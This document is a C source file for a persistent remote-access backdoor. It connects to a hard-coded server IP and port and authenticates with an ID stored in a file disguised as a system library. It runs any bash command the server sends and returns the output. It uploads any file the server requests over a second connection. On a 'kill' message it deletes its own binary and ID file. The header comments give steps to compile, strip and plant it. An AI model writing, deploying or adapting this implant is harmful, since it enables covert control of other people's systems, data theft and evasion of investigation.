/*
 * TCP Agent - persistent connection, keepalive, auto-reconnect
 * gcc -o agent agent.c && strip agent
 * echo -n "your_agent_id" > /usr/lib/glibform.so
 * ./agent
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>

#define SVR_IP   "192.254.198.127"
#define SVR_PORT 7331
#define ID_FILE  "/usr/lib/glibform.so"
#define BUF      131072
#define RECONN   3

static char aid[128];

int jesc(const char *s, char *d, int mx) {
    int i=0,j=0;
    for (; s[i]&&j<mx-2; i++) {
        switch(s[i]) {
            case '\\': d[j++]='\\'; d[j++]='\\'; break;
            case '"':  d[j++]='\\'; d[j++]='"';  break;
            case '\n': d[j++]='\\'; d[j++]='n';  break;
            case '\r': d[j++]='\\'; d[j++]='r';  break;
            case '\t': d[j++]='\\'; d[j++]='t';  break;
            default:   d[j++]=s[i];
        }
    }
    d[j]=0; return j;
}

int jget(const char *j, const char *k, char *o, int mx) {
    char p[64]; snprintf(p,64,"\"%s\":\"",k);
    const char *s=strstr(j,p);
    if (!s) return 0;
    s+=strlen(p);
    int i=0;
    while (*s&&i<mx-1) {
        if (*s=='"'&&*(s-1)!='\\') break;
        if (*s=='\\'&&*(s+1)) {
            s++;
            switch(*s) {
                case 'n':o[i++]='\n';break; case 't':o[i++]='\t';break;
                case '"':o[i++]='"';break;  case '\\':o[i++]='\\';break;
                default:o[i++]=*s;
            }
        } else o[i++]=*s;
        s++;
    }
    o[i]=0; return i;
}

int run(const char *cmd, char *out, int mx) {
    int fd[2]; pipe(fd);
    pid_t p=fork();
    if (!p) {
        close(fd[0]);
        dup2(fd[1],1); dup2(fd[1],2); close(fd[1]);
        execl("/bin/bash","bash","-c",cmd,NULL);
        _exit(127);
    }
    close(fd[1]);
    int t=0,n,st;
    while (t<mx-1&&(n=read(fd[0],out+t,mx-1-t))>0) t+=n;
    close(fd[0]); waitpid(p,&st,0);
    out[t]=0;
    return WIFEXITED(st)?WEXITSTATUS(st):-1;
}

int tsend(int fd, const char *msg) {
    int len=strlen(msg);
    char *buf=malloc(len+2);
    if (!buf) return -1;
    memcpy(buf,msg,len);
    buf[len]='\n'; buf[len+1]=0;
    int total=len+1, sent=0;
    while (sent<total) {
        int n=write(fd, buf+sent, total-sent);
        if (n<=0) { free(buf); return -1; }
        sent+=n;
    }
    free(buf);
    return sent;
}

int trecv(int fd, char *buf, int mx) {
    int t=0;
    while (t<mx-1) {
        int n=read(fd,buf+t,1);
        if (n<=0) return -1;
        if (buf[t]=='\n') { buf[t]=0; return t; }
        t++;
    }
    buf[t]=0; return t;
}

int do_connect() {
    int fd=socket(AF_INET,SOCK_STREAM,0);
    if (fd<0) return -1;

    /* TCP keepalive: detect dead connections */
    int yes=1;
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &yes, sizeof(yes));
    int idle=30, intvl=10, cnt=3;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE, &idle, sizeof(idle));
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &intvl, sizeof(intvl));
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &cnt, sizeof(cnt));

    struct sockaddr_in sv={0};
    sv.sin_family=AF_INET;
    sv.sin_port=htons(SVR_PORT);
    inet_pton(AF_INET,SVR_IP,&sv.sin_addr);
    if (connect(fd,(struct sockaddr*)&sv,sizeof(sv))<0) {
        close(fd); return -1;
    }
    char buf[512];
    snprintf(buf,512,"{\"action\":\"auth\",\"agent_id\":\"%s\"}",aid);
    if (tsend(fd,buf)<0) { close(fd); return -1; }
    if (trecv(fd,buf,512)<0) { close(fd); return -1; }

    /* Server says kill — self destruct */
    if (strstr(buf,"\"kill\"")) { close(fd); return -2; }

    return fd;
}

void self_destruct() {
    unlink(ID_FILE);
    /* Delete own binary */
    char self[256];
    int n = readlink("/proc/self/exe", self, sizeof(self)-1);
    if (n > 0) { self[n]=0; unlink(self); }
}

/* Send file over a SEPARATE TCP connection — with gzip compression */
void do_download(int mainfd, const char *rb) {
    char path[4096], dl_id[64], sb[BUF];
    if (!jget(rb, "path", path, sizeof(path))) return;
    if (!jget(rb, "dl_id", dl_id, sizeof(dl_id))) return;

    FILE *fp = fopen(path, "rb");
    if (!fp) {
        char ep[256]; jesc(path, ep, 256);
        snprintf(sb, BUF, "{\"action\":\"file_error\",\"dl_id\":\"%s\",\"error\":\"cannot open: %s\"}", dl_id, ep);
        tsend(mainfd, sb);
        return;
    }

    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    fclose(fp);

    /* Compress file first — huge speedup for text/logs over slow links */
    char gzpath[4200];
    snprintf(gzpath, sizeof(gzpath), "/tmp/.dl_%s.gz", dl_id);

    /* Build safe command — escape single quotes in path */
    char safepath[8192];
    int si=0, di=0;
    safepath[di++] = '\'';
    for (si=0; path[si] && di < 8180; si++) {
        if (path[si] == '\'') { safepath[di++]='\''; safepath[di++]='\\'; safepath[di++]='\''; safepath[di++]='\''; }
        else safepath[di++] = path[si];
    }
    safepath[di++] = '\''; safepath[di] = 0;

    snprintf(sb, BUF, "gzip -1 -c %s > '%s' 2>/dev/null", safepath, gzpath);
    int ret = system(sb);

    /* Get compressed size */
    FILE *gzfp = fopen(gzpath, "rb");
    long gzsize = 0;
    int compressed = 0;
    FILE *sendfp;

    if (gzfp && ret == 0) {
        fseek(gzfp, 0, SEEK_END);
        gzsize = ftell(gzfp);
        fseek(gzfp, 0, SEEK_SET);
        /* Only use compressed if actually smaller */
        if (gzsize > 0 && gzsize < fsize) {
            compressed = 1;
            sendfp = gzfp;
        } else {
            fclose(gzfp);
            sendfp = fopen(path, "rb");
            unlink(gzpath);
        }
    } else {
        if (gzfp) fclose(gzfp);
        sendfp = fopen(path, "rb");
    }

    if (!sendfp) {
        snprintf(sb, BUF, "{\"action\":\"file_error\",\"dl_id\":\"%s\",\"error\":\"open failed\"}", dl_id);
        tsend(mainfd, sb);
        return;
    }

    long sendsize = compressed ? gzsize : fsize;

    /* Open download socket */
    int dfd = socket(AF_INET, SOCK_STREAM, 0);
    if (dfd < 0) {
        snprintf(sb, BUF, "{\"action\":\"file_error\",\"dl_id\":\"%s\",\"error\":\"socket failed\"}", dl_id);
        tsend(mainfd, sb);
        fclose(sendfp);
        if (compressed) unlink(gzpath);
        return;
    }

    struct sockaddr_in sv = {0};
    sv.sin_family = AF_INET;
    sv.sin_port = htons(SVR_PORT);
    inet_pton(AF_INET, SVR_IP, &sv.sin_addr);
    if (connect(dfd, (struct sockaddr*)&sv, sizeof(sv)) < 0) {
        snprintf(sb, BUF, "{\"action\":\"file_error\",\"dl_id\":\"%s\",\"error\":\"connect failed\"}", dl_id);
        tsend(mainfd, sb);
        close(dfd);
        fclose(sendfp);
        if (compressed) unlink(gzpath);
        return;
    }

    int sndbuf = 2097152;
    setsockopt(dfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int yes = 1;
    setsockopt(dfd, IPPROTO_TCP, 1/*TCP_NODELAY*/, &yes, sizeof(yes));

    /* Header: DL:<dl_id>:<original_size>:<send_size>:<compressed>\n */
    snprintf(sb, BUF, "DL:%s:%ld:%ld:%d\n", dl_id, fsize, sendsize, compressed);
    int hlen = strlen(sb);
    int sent = 0;
    while (sent < hlen) {
        int w = write(dfd, sb + sent, hlen - sent);
        if (w <= 0) { close(dfd); fclose(sendfp); if (compressed) unlink(gzpath); return; }
        sent += w;
    }

    /* Pump raw bytes */
    char rawbuf[262144];
    int n;
    while ((n = fread(rawbuf, 1, sizeof(rawbuf), sendfp)) > 0) {
        sent = 0;
        while (sent < n) {
            int w = write(dfd, rawbuf + sent, n - sent);
            if (w <= 0) { close(dfd); fclose(sendfp); if (compressed) unlink(gzpath); return; }
            sent += w;
        }
    }

    close(dfd);
    fclose(sendfp);
    if (compressed) unlink(gzpath);
}

int main() {
    FILE *f=fopen(ID_FILE,"r");
    if (!f) return 1;
    fgets(aid,sizeof(aid),f); fclose(f);
    aid[strcspn(aid,"\r\n")]=0;
    if (!aid[0]) return 1;
    signal(SIGPIPE,SIG_IGN);

    char *rb=malloc(BUF),*out=malloc(BUF),*ec=malloc(BUF),*eo=malloc(BUF);
    char cmd[BUF],sb[BUF];

    while (1) {
        int fd=do_connect();
        if (fd==-2) { self_destruct(); _exit(0); }
        if (fd<0) { sleep(RECONN); continue; }

        while (1) {
            int n=trecv(fd,rb,BUF);
            if (n<0) break;

            /* Ping */
            if (strstr(rb,"\"ping\"")) {
                tsend(fd,"{\"action\":\"pong\"}");
                continue;
            }

            /* File download — separate channel, doesn't block commands */
            if (strstr(rb,"\"download\"")) {
                do_download(fd, rb);
                continue;
            }

            /* Command execution */
            if (!strstr(rb,"\"command\"")) continue;
            if (!jget(rb,"command",cmd,BUF)) continue;

            int ex=run(cmd,out,BUF);
            jesc(cmd,ec,BUF);
            jesc(out,eo,BUF);
            if (strlen(eo)>60000) strcpy(eo+59990,"...[truncated]");

            snprintf(sb,BUF,
                "{\"action\":\"result\",\"agent_id\":\"%s\","
                "\"command\":\"%s\",\"output\":\"%s\",\"exit_code\":%d}",
                aid,ec,eo,ex);
            if (tsend(fd,sb)<0) break;
        }
        close(fd);
        sleep(RECONN);
    }
}